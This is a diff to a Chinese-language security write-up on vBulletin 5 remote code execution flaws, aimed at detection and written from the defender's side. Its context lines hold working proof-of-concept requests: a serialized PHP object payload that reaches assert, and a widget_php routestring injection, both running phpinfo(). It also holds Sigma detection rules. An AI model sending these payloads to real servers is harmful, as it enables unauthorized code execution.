@@ -17,31 +17,32 @@ vBulletin 5 全版本远程代码执行漏洞分析
 ### 检测日志
 访问日志
 ### 测试复现
-```
-yml
+```yaml
 GET /vBulletin/ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2A%00db%22%3BO%3A17%3A%22vB_Database_MySQL%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A6%3A%22assert%22%3B%7D%7Ds%3A12%3A%22%00%2A%00recordset%22%3Bs%3A9%3A%22phpinfo%28%29%22%3B%7D HTTP/1.1
 Host: 192.168.0.106
 Cookie: XDEBUG_SESSION=PHPSTORM
 Connection: close
 ```
 解码后：
-```
-yml
+```yaml
 GET /vBulletin/ajax/api/hook/decodeArguments?arguments=O:12:"vB_dB_Result":2:{s:5:"*db";O:17:"vB_Database_MySQL":1:{s:9:"functions";a:1:{s:11:"free_result";s:6:"assert";}}s:12:"*recordset";s:9:"phpinfo()";} HTTP/1.1
 ```
 ### 测试留痕
 暂无
 ### 检测规则/思路
 sigma规则
-```
-yml
+```yaml
 title: vBulletin5.X-CVE-2015-7808-RCE-检测规则
+id: 09bc0d57-9e04-53a0-9410-89dabf4df519
 description: 通过访问日志检测CVE-2015-7808远程命令执行漏洞利用行为
-translator: 12306Bro
+translator: 0x783kb
+author: 0x783kb
 date: 2020/12/16
 status: experimental
 references:
     - https://xz.aliyun.com/t/6497
+tags:
+  - attack.t1190
 logsource:
     category: webserver
 detection:
@@ -72,8 +73,7 @@ CVE-2019-16759 vBulletin 5.x 未授权远程代码执行漏洞
 访问日志 OR HTTP.log
 ### 测试复现过程
 POC1
-```
-yml
+```yaml
 http://IP/?routestring=ajax%2Frender%2Fwidget_php&widgetConfig[code]=phpinfo();exit;
 ```
 POC2:CVE-2019-16759 vBulletin 5.x 未授权远程代码执行漏洞
@@ -107,16 +107,19 @@ while True:
 <https://github.com/jas502n/CVE-2019-16759>
 ### 检测规则
 sigma规则
-```
-yml
+```yaml
 title: vBulletin5.X-CVE-2015-7808-RCE-检测规则
+id: f33fd896-8173-51c2-80e6-91077537e0fb
 description: 通过访问日志检测CVE-2015-7808远程命令执行漏洞利用行为
-translator: 12306Bro
+translator: 0x783kb
+author: 0x783kb
 date: 2020/12/16
 status: experimental
 references:
     - https://github.com/jas502n/CVE-2019-16759
     - https://blog.csdn.net/weixin_41064688/article/details/108060313
+tags:
+  - attack.t1190
 logsource:
     category: webserver
 detection:
